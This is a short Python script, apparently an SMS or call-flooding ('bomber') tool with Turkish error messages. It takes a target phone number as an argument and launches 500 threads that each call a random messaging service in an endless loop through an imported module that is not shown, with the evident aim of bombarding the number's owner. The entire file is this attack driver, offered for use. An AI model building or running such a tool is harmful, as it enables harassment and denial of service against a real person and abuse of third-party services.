import sys, os
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore
attack_number_phone = Distribution_Service()


def start(phone):
	attack_number_phone.phone(phone)

	while True:
		try:
			attack_number_phone.random_service()
		except Exception as ex:
			print(ex)
if len(sys.argv) > 1:
    phone = sys.argv[1]
else:
    print (Fore.RED + 'НATALI SEÇİM')
    sys.exit()

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + 'НATALI NUMARA GİRİLDİ')
	sys.exit()

os.system("touch successful")

for i in range(500):
    th = Thread(target=start, args=(phone, ))
    th.start()

